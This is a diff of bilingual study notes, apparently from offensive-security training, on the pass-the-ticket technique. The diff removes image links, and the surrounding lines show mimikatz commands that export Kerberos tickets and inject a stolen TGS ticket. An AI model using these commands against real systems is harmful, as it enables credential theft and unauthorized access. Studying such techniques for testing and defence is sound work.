@@ -13,7 +13,7 @@ In the previous section, we used the overpass the hash technique (along with the
 
 En este ejemplo;
 
-![[Pasted image 20230527130456.png]]
+
 
 Desde mimikatz:
 
@@ -22,7 +22,7 @@ privilege::debug
 sekurlsa::tickets /export
 ```
 
-![[Pasted image 20230527130247.png]]
+
 
 We can verify newly generated tickets with **dir**, filtering out on the **kirbi** extension.
 
@@ -30,7 +30,7 @@ We can verify newly generated tickets with **dir**, filtering out on the **kir
 dir *.kirbi
 ```
 
-we can just pick any TGS ticket in the dave@cifs-web04.kirbi format and inject it through mimikatz via the kerberos::ptt command.
+we can just pick any TGS ticket in the kirbi format and inject it through mimikatz via the kerberos::ptt command.
 
 ```
 mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
